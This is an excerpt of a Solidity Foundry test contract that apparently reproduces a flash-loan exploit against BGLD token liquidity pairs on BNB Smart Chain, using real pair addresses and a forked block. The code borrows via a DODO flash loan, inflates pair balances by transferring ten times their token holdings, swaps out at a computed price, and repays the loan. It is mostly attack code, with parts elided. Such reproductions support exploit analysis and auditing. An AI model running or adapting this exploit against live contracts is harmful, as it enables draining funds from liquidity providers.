...
contract ContractTest is Test {
    ...
    IUniswapV2Pair WBNB_oldBGLD =
        IUniswapV2Pair(0x7526cC9121Ba716CeC288AF155D110587e55Df8b);
    IUniswapV2Pair oldBGLD_DEBT =
        IUniswapV2Pair(0x429339fa7A2f2979657B25ed49D64d4b98a2050d);
    IUniswapV2Pair newBGLD_DEBT =
        IUniswapV2Pair(0x559D0deAcAD259d970f65bE611f93fCCD1C44261);

    function setUp() public {
        vm.createSelectFork("bsc", 23_844_529);
    }
    ...
    function DPPFlashLoanCall(
        ...
        oldBGLD.transfer(
            address(WBNB_oldBGLD),
            oldBGLD.balanceOf(address(WBNB_oldBGLD)) * 10 + 10
        );
    ...
    function pancakeCall(
        ...
        (uint256 oldBGLDreserve, uint256 DEBTreserve, ) = oldBGLD_DEBT
            .getReserves();
        uint256 amountIn = DEBT.balanceOf(address(oldBGLD_DEBT)) - DEBTreserve;
        uint256 amountOut = (amountIn * 9975 * oldBGLDreserve) /
            (DEBTreserve * 10_000 + amountIn * 9975);
        oldBGLD_DEBT.swap((amountOut * 90) / 100, 0, address(this), "");
        oldBGLD.transfer(
            address(oldBGLD_DEBT),
            oldBGLD.balanceOf(address(oldBGLD_DEBT)) * 10 + 10
        );
        ...
        DEBT.transfer(
            address(newBGLD_DEBT),
            (loanAmount * 10_000) / 9975 + 1000
        );
    }
